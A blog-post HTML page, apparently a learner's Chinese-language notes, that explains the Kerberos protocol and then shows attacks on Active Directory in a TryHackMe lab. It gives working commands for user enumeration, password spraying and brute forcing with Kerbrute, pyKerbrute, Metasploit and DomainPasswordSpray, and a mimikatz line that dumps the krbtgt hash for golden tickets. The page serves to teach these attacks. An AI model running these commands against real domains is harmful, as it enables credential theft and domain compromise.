@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang='zh-CN'>
+
+<head>
+  <meta name="generator" content="Hexo 6.3.0">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://gcore.jsdelivr.net'>
+  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin>
+  <link rel='dns-prefetch' href='//unpkg.com'>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>Kerberos攻击方式【委派还没总结】 - v2ish1yan`s blog</title>
+
+  
+    <meta name="description" content="0x00 前言这一篇文章是我对自己学习kerberos过程中的一点总结，有些错误还请指出 0x01 什么是KerberosKerberos 是一种网络身份验证协议。它旨在通过使用密钥加密为客户端&#x2F;服务器应用程序提供强大的身份验证。 他是一个无密码基于ticket的认证方式。 整个kerberos分为三个部分：  访问服务的客户端(Client) 提供服务的服务端(Service) 提供认">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kerberos攻击方式【委派还没总结】">
+<meta property="og:url" content="http://example.com/2023/07/03/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Kerberos/index.html">
+<meta property="og:site_name" content="v2ish1yan&#96;s blog">
+<meta property="og:description" content="0x00 前言这一篇文章是我对自己学习kerberos过程中的一点总结，有些错误还请指出 0x01 什么是KerberosKerberos 是一种网络身份验证协议。它旨在通过使用密钥加密为客户端&#x2F;服务器应用程序提供强大的身份验证。 他是一个无密码基于ticket的认证方式。 整个kerberos分为三个部分：  访问服务的客户端(Client) 提供服务的服务端(Service) 提供认">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302152252966.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302222004154.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302161540200.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302161549043.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302161553073.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302161702729.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302161700639.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302172028437.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302172120594.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302172127309.png">
+<meta property="article:published_time" content="2023-07-03T08:36:07.748Z">
+<meta property="article:modified_time" content="2023-07-03T08:36:07.826Z">
+<meta property="article:author" content="v2ish1yan">
+<meta property="article:tag" content="AD域">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302152252966.png">
+  
+  
+  
+  <meta name="keywords" content="AD域">
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+    <link rel="shortcut icon" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302120002492.png">
+  
+
+  
+
+  
+
+
+  
+</head>
+
+<body>
+  
+
+<div class="l_cover post"><div class="cover"><div class="lazy img bg" data-bg="https://source.unsplash.com/2000x400/?workout,strava"></div></div></div>
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+  
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302120001591.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">v2ish1yan`s blog</div></a></div>
+
+<nav class="menu dis-select"><a class="nav-item active" href="/">文章</a><a class="nav-item" href="/links/">友链</a></nav>
+</header>
+
+
+<div class="widgets">
+<widget class="widget-wrapper search"><div class="widget-body"><div class="search-wrapper" id="search"><form class="search-form"><input type="text" class="search-input" id="search-input" data-filter="/blog/" placeholder="文章搜索"><svg t="1670596976048" class="icon search-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2676" width="200" height="200"><path d="M938.2 832.6L723.8 618.1c-2.5-2.5-5.3-4.4-7.9-6.4 36.2-55.6 57.3-121.8 57.3-193.1C773.3 222.8 614.6 64 418.7 64S64 222.8 64 418.6c0 195.9 158.8 354.6 354.6 354.6 71.3 0 137.5-21.2 193.2-57.4 2 2.7 3.9 5.4 6.3 7.8L832.5 938c14.6 14.6 33.7 21.9 52.8 21.9 19.1 0 38.2-7.3 52.8-21.8 29.2-29.1 29.2-76.4 0.1-105.5M418.7 661.3C284.9 661.3 176 552.4 176 418.6 176 284.9 284.9 176 418.7 176c133.8 0 242.6 108.9 242.6 242.7 0 133.7-108.9 242.6-242.6 242.6" p-id="2677"></path></svg></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div></div></widget>
+
+
+<widget class="widget-wrapper toc single" id="data-toc"><div class="widget-header cap dis-select"><span class="name">Kerberos攻击方式【委派还没总结】</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BB%80%E4%B9%88%E6%98%AFKerberos"><span class="toc-text">0x01 什么是Kerberos</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REQ"><span class="toc-text">AS_REQ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REP"><span class="toc-text">AS_REP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TGS-REQ"><span class="toc-text">TGS_REQ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TGS-REP"><span class="toc-text">TGS_REP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AP-REQ"><span class="toc-text">AP_REQ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AP-REP"><span class="toc-text">AP_REP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REQ-1"><span class="toc-text">AS_REQ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-The-Hash"><span class="toc-text">Pass The Hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="toc-text">域用户枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Kerbrute"><span class="toc-text">Kerbrute</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pyKerbrute"><span class="toc-text">pyKerbrute</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF%E6%A8%A1%E5%9D%97"><span class="toc-text">MSF模块</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92-Password-Spraying"><span class="toc-text">密码喷洒(Password Spraying)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Kerbrute-1"><span class="toc-text">Kerbrute</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pyKerbrute-1"><span class="toc-text">pyKerbrute</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DomainPasswordSpray-ps1"><span class="toc-text">DomainPasswordSpray.ps1</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REP-1"><span class="toc-text">AS_REP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E6%94%BB%E5%87%BB"><span class="toc-text">黄金票据攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REP-Roasting%E6%94%BB%E5%87%BB"><span class="toc-text">AS_REP Roasting攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Rubeus"><span class="toc-text">Rubeus</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ASREPRoast-ps1"><span class="toc-text">ASREPRoast.ps1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Adfind%E5%92%8Cimpacket"><span class="toc-text">Adfind和impacket</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TGS-REP-1"><span class="toc-text">TGS_REP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberoasting"><span class="toc-text">Kerberoasting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SPN%E7%9A%84%E5%8F%91%E7%8E%B0"><span class="toc-text">SPN的发现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%9C%8D%E5%8A%A1%E7%A5%A8%E6%8D%AE%EF%BC%88ST%EF%BC%89"><span class="toc-text">请求服务票据（ST）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%9C%8D%E5%8A%A1%E7%A5%A8%E6%8D%AE"><span class="toc-text">导出内存中的服务票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E7%88%86%E7%A0%B4%E7%A5%A8%E6%8D%AE"><span class="toc-text">离线爆破票据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E6%94%BB%E5%87%BB"><span class="toc-text">白银票据攻击</span></a></li></ol></li></ol></div></div></widget>
+
+
+
+
+</div>
+
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><div id="post-meta">发布于&nbsp;<time datetime="2023-07-03T08:36:07.748Z">2023-07-03</time></div></div>
+
+<article class='md-text content post'>
+<h1 class="article-title"><span>Kerberos攻击方式【委派还没总结】</span></h1>
+<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这一篇文章是我对自己学习kerberos过程中的一点总结，有些错误还请指出</p>
+<h2 id="0x01-什么是Kerberos"><a href="#0x01-什么是Kerberos" class="headerlink" title="0x01 什么是Kerberos"></a>0x01 什么是Kerberos</h2><p>Kerberos 是一种网络身份验证协议。它旨在通过使用密钥加密为客户端&#x2F;服务器应用程序提供强大的身份验证。</p>
+<p>他是一个无密码基于ticket的认证方式。</p>
+<p>整个kerberos分为三个部分：</p>
+<ul>
+<li>访问服务的客户端(Client)</li>
+<li>提供服务的服务端(Service)</li>
+<li>提供认证服务的密钥分发中心，Key Distribution Center(KDC)</li>
+</ul>
+<p>KDC由三个部分组成</p>
+<ul>
+<li>认证服务器，Authentication Server(AS):进行用户信息认证，为客户端提供 Ticket Granting Tickets(TGT)。</li>
+<li>票据授权服务器，Ticker Granting Server(TGS):验证 TGT 与 Authenticator，为客户端提供 Service Tickets。</li>
+<li>Kerberos数据库，Kerberos Database:包含了一个域中所有的用户信息。</li>
+</ul>
+<h1 id="0x02-Kerberos认证过程"><a href="#0x02-Kerberos认证过程" class="headerlink" title="0x02 Kerberos认证过程"></a>0x02 Kerberos认证过程</h1><p>简易的认证过程如下</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302152252966.png" alt="kerberos流程图" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">kerberos流程图</span></div></div>
+
+<h2 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS_REQ"></a>AS_REQ</h2><p>Client发送的请求包内容包括：</p>
+<ul>
+<li>请求的用户名cname</li>
+<li>域名realm</li>
+<li>Authenticator（用户密钥加密的时间戳）</li>
+<li>请求的服务名sname</li>
+<li>加密类型etype</li>
+<li>其他信息，版本号、消息类型，票据有效时间、是否包含pac。协商选项等</li>
+</ul>
+<p>Authenticator是预身份验证的部分</p>
+<h2 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS_REP"></a>AS_REP</h2><p>如果开启了预身份验证，那么AS就会从活动目录数据库中取出该用户的密钥，然后用该密钥对请求包中预身份验证部分(Authenticator)进行解密，如果解密成功，并且解密出来的时间戳在一定范围内，则证明请求者提供的用户密钥正确。【如果没有开启身份验证，就不会有这段过程，这也是AS_REP Roasting攻击的前提】</p>
+<p>在AS成功认证之后，就会给客户端发送AS_REP包，AS_REP数据包的主要内容包括:</p>
+<ul>
+<li>版本号、域名、用户名等</li>
+<li><strong>TGT</strong>(Ticket Granting ticket)</li>
+<li>Logon Session Key</li>
+</ul>
+<p><em><strong>TGT</strong></em>是用krbtgt的密码哈希进行加密的，Logon Session Key是由用户的密码哈希进行加密的【krbtgt是KDC的服务账户】，TGT代表了是哪个用户在进行请求服务的操作</p>
+<p>其中 TGT里包含</p>
+<ul>
+<li>PAC（Privilege Attribute certificate），PAC包含各种授权信息、附加凭据信息、配置文件和策略信息等，例如用户所属的用户组、用户所具有的权限等。</li>
+<li>Logon Session Key</li>
+<li>用户名、域名、认证时间、认证到期时间</li>
+</ul>
+<p>总的来说，在经过这个过程后，AS会给Client返回一个包含PAC信息的TGT，TGT用来向TGS申请相关服务的ST（Server ticket)</p>
+<h2 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS_REQ"></a>TGS_REQ</h2><p>客户端在收到AS_REP后会在本地缓存TGT和Logon Session Key，然后用TGT向TGS购买相应服务的ST</p>
+<p>TGS_REQ数据包的主要内容包括</p>
+<ul>
+<li>域名realm</li>
+<li>请求的服务名sname</li>
+<li>TGT</li>
+<li>Authenticator(用Logon Session Key加密的时间戳)，用于保证会话的安全性</li>
+<li>加密类型</li>
+<li>其他信息，如版本号、消息类型、协商选项、到期时间等</li>
+</ul>
+<h2 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS_REP"></a>TGS_REP</h2><p>在TGS收到TGS_REQ之后，会进行如下操作</p>
+<p>首先，使用krbtgt密码哈希值对TGT的加密部分进行解密。得到Logon Session Key和PAC等信息，解密成功则说明是KDC颁发的</p>
+<p>然后，验证PAC的签名，签名正确则证明PAC未经过篡改【PAC有两个数字签名：PAC_SERVER_CHECKSUM和PAC_PRIVSVR_CHECKSUM；PAC_SERVER_CHECKSUM使用服务密钥进行签名，PAC_PRIVSVR_CHECKSUM使用KDC密钥进行签名】</p>
+<p>最后，使用得到的Logon Session Key解密Authenticator得到时间戳等信息，如果解密成功且时间在有效范围内，则验证了会话的安全性</p>
+<p>进行如上验证之后，TGS_REP就会返回包含如下内容的数据包:</p>
+<ul>
+<li>版本号、域名、用户名等</li>
+<li>ST</li>
+<li>Service Session Key</li>
+</ul>
+<p>ST的明文部分包含版本号、域名、请求的服务名</p>
+<p>ST的加密部分（使用服务密钥加密）包括:</p>
+<ul>
+<li>Service Session Key</li>
+<li>PAC</li>
+<li>用户名、域名、认证时间、认证信息等</li>
+</ul>
+<p>ST里和ST外的Service Session Key都是用Logon Session Key进行加密的，用于下一阶段的认证密钥</p>
+<h2 id="AP-REQ"><a href="#AP-REQ" class="headerlink" title="AP_REQ"></a>AP_REQ</h2><p>在客户端收到TGS_REP后，从中抽取ST和Service Session Key并准备开始申请访问服务</p>
+<p>AP_REQ数据包中包含的内容:</p>
+<ul>
+<li>ST</li>
+<li>Authenticator(用Service Session Key加密的时间戳)</li>
+<li>其他信息，如版本号、消息类型、协商选项等</li>
+</ul>
+<h2 id="AP-REP"><a href="#AP-REP" class="headerlink" title="AP_REP"></a>AP_REP</h2><p>这一步是可选的，当客户端希望验证提供服务的服务端时（即AP_REQ请求的mutual-required选项为True），服务端就返回AP_REP消息。</p>
+<p>服务端收到客户端发来的AP_REQ之后，通过服务密钥解密ST得到Service Session Key和PAC等信息，然后用Service Session Key解密Authenticator得到时间戳。如果解密成功且时间戳在有效范围内，则验证了客户端的身份。</p>
+<p>验证了客户端身份后，服务端从ST中取出PAC中代表用户身份权限信息（主要通过User RID和Group RID）的数据，然后与请求的服务ACL做对比，生成相应的访问令牌。</p>
+<p>同时，服务端会检测AP_REQ请求的mutual-required选项是否为True，如果是，则说明客户端想验证提供服务的服务端的身份。此时，服务端会用Service Session Key加密的时间戳作为Authenticator，在AP_REP包中发送给客户端进行验证。如果为False，服务端会根据访问令牌的权限决定是否返回相应的服务给客户端</p>
+<h1 id="0x03-Kerberos协议的安全问题"><a href="#0x03-Kerberos协议的安全问题" class="headerlink" title="0x03 Kerberos协议的安全问题"></a>0x03 Kerberos协议的安全问题</h1><div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302222004154.png" alt="未命名-2" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">未命名-2</span></div></div>
+
+<h2 id="AS-REQ-1"><a href="#AS-REQ-1" class="headerlink" title="AS_REQ"></a>AS_REQ</h2><h3 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass The Hash"></a>Pass The Hash</h3><p>因为在AS_REQ过程中是使用用户的密码对时间戳进行加密的，所以如果获取了一个用户的密码hash，那么就可以伪造成这个用户来对服务进行访问</p>
+<p>但是攻击手法我在网上没有搜到</p>
+<h3 id="域用户枚举"><a href="#域用户枚举" class="headerlink" title="域用户枚举"></a>域用户枚举</h3><p>在AS_REQ包中的cname字段的值代表用户名，这个值存在与否，返回的包是不一样的。所以可以用来枚举域用户名</p>
+<p>枚举工具:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute/releases">Kerbrute</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/3gstudent/pyKerbrute">pyKerbrute</a></li>
+<li>MSF模块</li>
+</ul>
+<p>下面在Try hack me的环境下进行实践(自己搭环境太麻烦了 XD)</p>
+<h4 id="Kerbrute"><a href="#Kerbrute" class="headerlink" title="Kerbrute"></a>Kerbrute</h4><p>要先将域名和ip添加到&#x2F;etc&#x2F;host里，进行域名解析</p>
+<p>字典是关键</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/tools/for kerberos/kerbrute]</span><br><span class="line">└─$ ./kerbrute userenum --dc CONTROLLER.<span class="built_in">local</span> -d CONTROLLER.<span class="built_in">local</span> ./dict/users.txt</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302161540200.png" alt="image-20230216154037154" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230216154037154</span></div></div>
+
+<h4 id="pyKerbrute"><a href="#pyKerbrute" class="headerlink" title="pyKerbrute"></a>pyKerbrute</h4><p>使用python通过Kerberos Pre-Authentication快速暴力破解并枚举有效的Active Directory账户</p>
+<p>有TCP和UDP两种模式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EnumADUser.py &lt;domainControlerAddr&gt; &lt;domainName&gt; &lt;mode&gt;</span><br><span class="line">&lt;mode&gt;: tcp or udp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 EnumADUser.py  10.10.65.205  CONTROLLER.<span class="built_in">local</span> dict/users.txt  tcp</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302161549043.png" alt="image-20230216154950000" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230216154950000</span></div></div>
+
+<h4 id="MSF模块"><a href="#MSF模块" class="headerlink" title="MSF模块"></a>MSF模块</h4><p><code>auxiliary/gather/kerberos_enumusers</code>模块</p>
+<p>设置相应的参数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(gather/kerberos_enumusers) &gt; <span class="built_in">set</span> DOMAIN CONTROLLER.<span class="built_in">local</span></span><br><span class="line">DOMAIN =&gt; CONTROLLER.<span class="built_in">local</span></span><br><span class="line">msf6 auxiliary(gather/kerberos_enumusers) &gt; <span class="built_in">set</span> RHOSTS 10.10.65.205</span><br><span class="line">RHOSTS =&gt; 10.10.65.205</span><br><span class="line">msf6 auxiliary(gather/kerberos_enumusers) &gt; <span class="built_in">set</span> USER_FILE /tmp/users.txt</span><br><span class="line">USER_FILE =&gt; /tmp/users.txt</span><br><span class="line">msf6 auxiliary(gather/kerberos_enumusers) &gt; run</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302161553073.png" alt="image-20230216155352995" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230216155352995</span></div></div>
+
+<p>还会检测是否开启预身份验证而且还给了hash，良心！！！</p>
+<h3 id="密码喷洒-Password-Spraying"><a href="#密码喷洒-Password-Spraying" class="headerlink" title="密码喷洒(Password Spraying)"></a>密码喷洒(Password Spraying)</h3><p>在AS_REQ过程中，如果用户名存在，密码正确与否，返回的包也是不一样的，所以可以使用单一的密码，对用户字典里的用户进行爆破，就是密码喷洒</p>
+<p>工具:</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute/releases">Kerbrute</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/3gstudent/pyKerbrute">pyKerbrute</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1">DomainPasswordSpray.ps1</a></p>
+</li>
+</ul>
+<h4 id="Kerbrute-1"><a href="#Kerbrute-1" class="headerlink" title="Kerbrute"></a>Kerbrute</h4><p>使用以下命令，对指定的域用用户字典进行爆破，找出密码为P@ss1234的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute passwordspray --dc CONTROLLER.<span class="built_in">local</span> -d CONTROLLER.<span class="built_in">local</span> ./dict/users.txt P@ss1234</span><br></pre></td></tr></table></figure>
+
+<p>使用以下命令，爆破用户的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute bruteuser --dc CONTROLLER.<span class="built_in">local</span> -d CONTROLLER.<span class="built_in">local</span> ./dict/password.txt  administrator</span><br></pre></td></tr></table></figure>
+
+<h4 id="pyKerbrute-1"><a href="#pyKerbrute-1" class="headerlink" title="pyKerbrute"></a>pyKerbrute</h4><p>在tcp模式下可以对明文密码和Hash密码进行喷洒攻击</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ADPwdSpray.py &lt;domainControlerAddr&gt; &lt;domainName&gt; &lt;file&gt; &lt;passwordtype&gt; &lt;data&gt; &lt;mode&gt;</span><br><span class="line">&lt;mode&gt;: tcp or udp</span><br><span class="line">&lt;passwordtype&gt;: clearpassword oe ntlmhash</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2  10.10.65.205  CONTROLLER.<span class="built_in">local</span> dict/users.txt clearpassword P@ss1234 tcp</span><br></pre></td></tr></table></figure>
+
+<h4 id="DomainPasswordSpray-ps1"><a href="#DomainPasswordSpray-ps1" class="headerlink" title="DomainPasswordSpray.ps1"></a>DomainPasswordSpray.ps1</h4><p>要在域内的机器执行,原理是利用LDAP从域中导出用户列表，去除被锁定的用户，再用指定密码进行喷洒</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\DomainPasswordSpray.ps1</span><br><span class="line">Invoke-DomainPasswordSpray -Password P@ass1234</span><br></pre></td></tr></table></figure>
+
+<h2 id="AS-REP-1"><a href="#AS-REP-1" class="headerlink" title="AS_REP"></a>AS_REP</h2><h3 id="黄金票据攻击"><a href="#黄金票据攻击" class="headerlink" title="黄金票据攻击"></a>黄金票据攻击</h3><p>所谓黄金票据，就是利用krbtgt的密码哈希值来伪造一个TGT，可以用来伪造任意用户的TGT，甚至这个用户不存在！</p>
+<p>生成黄金票据的条件如下</p>
+<ul>
+<li>域名称[AD PowerShell模块：（Get-ADDomain）.DNSRoot] </li>
+<li>域的SID值[AD PowerShell模块：（Get-ADDomain）.DomainSID.Value] </li>
+<li>域的KRBTGT账户NTLM密码哈希</li>
+<li>要伪造的用户名</li>
+</ul>
+<p>可以是Mimikatz来转储krbtgt的密码哈希值，需要在域控上使用</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;Log&quot; &quot;Privilege::Debug&quot; &quot;lsadump::lsa /patch&quot; &quot;<span class="keyword">exit</span>&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以获得krbtgt的NTLM-Hash和domain SID</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302161702729.png" alt="image-20230216170214694" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230216170214694</span></div></div>
+
